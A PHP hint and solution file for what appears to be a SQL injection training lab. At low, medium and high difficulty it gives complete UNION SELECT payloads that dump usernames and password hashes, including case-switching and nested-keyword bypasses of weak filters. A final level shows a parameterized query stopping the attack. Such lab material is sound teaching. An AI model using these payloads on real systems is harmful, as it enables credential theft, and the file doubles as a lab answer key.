<?php
$p = '/labs/sqli-search/run?q=';
$low = "zz' UNION SELECT 1,username,password_md5,4 FROM users -- -";
$med = "zz' UNION SELECT 1,username,password_md5,4 FROM users -- -";
$high = "zz' UNunionION SELselectECT 1,username,password_md5,4 FROM users -- -";
return [
  'low' => [
    'goal' => "Break out of the string literal and append a UNION that reads from the users table.",
    'steps' => [
      "A single quote (') ends the value inside WHERE name LIKE '%...%', so the rest of your input becomes SQL, not data.",
      "UNION SELECT needs the same column count as the original query. This one returns four columns, so select four values and put username and password_md5 in the visible ones.",
      "Finish with -- - to comment out the trailing '%' the original query still has.",
      "Full term: $low",
    ],
    'why' => "The query string was built by gluing your input into it, so the database parsed your quote and UNION as query structure. It then returned rows from users alongside the product rows, exposing the admin hash the search was never meant to reach.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode($low)]],
  ],
  'medium' => [
    'goal' => "Defeat the keyword filter that only removes lowercase union and select.",
    'steps' => [
      "str_replace strips the exact lowercase words 'union' and 'select'. It never touches uppercase.",
      "Write the keywords in uppercase (or mixed case); MySQL is case-insensitive for keywords, so they still run.",
      "Full term: $med",
    ],
    'why' => "A denylist that matches one spelling is trivially bypassed by another. UNION and SELECT in uppercase pass the filter untouched and the database treats them exactly like their lowercase forms.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode($med)]],
  ],
  'high' => [
    'goal' => "Defeat the case-insensitive but single-pass filter by nesting the keywords.",
    'steps' => [
      "str_ireplace removes 'union' and 'select' once, in a single pass, then stops.",
      "Hide each keyword inside itself: UNunionION has 'union' in the middle; removing it once leaves UNION. Same for SELselectECT.",
      "Full term: $high",
    ],
    'why' => "Because the filter runs only once, it removes the inner keyword you planted and reassembles the real one from the surrounding letters. The cleaned string handed to the database contains a valid UNION SELECT.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode($high)]],
  ],
  'secure' => [
    'goal' => "Confirm the parameterized query cannot be injected.",
    'steps' => [
      "The term is bound as a parameter (LIKE ?), so the database receives the query text and the value separately.",
      "Send the same UNION payload and watch it be treated as a literal search string, returning no extra rows.",
    ],
    'why' => "With a bound parameter the database never parses your input as SQL; quotes and keywords are just characters to match. There is no string concatenation for an injection to break out of.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode($low)]],
  ],
];
